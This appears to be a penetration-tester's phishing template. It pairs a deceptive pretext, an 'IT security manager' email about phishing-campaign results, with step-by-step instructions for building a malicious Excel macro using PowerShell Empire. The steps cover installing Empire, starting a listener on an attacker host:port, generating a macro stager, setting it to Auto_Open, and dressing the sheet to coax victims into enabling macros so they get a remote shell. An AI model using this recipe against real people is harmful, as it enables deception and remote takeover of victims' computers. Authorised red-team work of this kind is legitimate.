# Phishing Awareness Training Email 

** Objective:** Shell

## Pretext: 
You are an IT Security Manager, or IT Admin who has reciently conducted a phishing awareness campaign against your company. You are asking users to read through the email for phishing awareness and to download and view the results of the phishing campaign. The excel document needs macros enabled to view the results

## To Change:
Create your own macros (Empire is easiest) to call back. 

## Creating a malicious Macros via Empire
1. Installing Empire
  a. git clone git@github.com:PowerShellEmpire/Empire.git
  b. ./setup/install.sh
2. Starting up a listener:
  a. set host <listening host:port>
  b. set whatever parameters you want on this, just type 'info'
  c. 'execute'
3. Generating the Macro
  a. usestager macro
  b. set listener <listener number>
  c. 'execute'
  d. copy the output function
4. Inserting the macro
  a. Open Excel > New Document > 'alt+F11' will get you to the macros
  b. Double-clck on "This Workbook"
  c. Paste in the macro function from Empire
  d. Change the Sub call to 'Auto_Open()'
  e. Add the line 'Dim str As String' to the top of the Debugging function call before the powershell call.
  f. Go back to the spreadsheet and add in whatever content you want. I like to add in random strings and at the top say that macros needs enabled to view the content. Helps with the pretext.
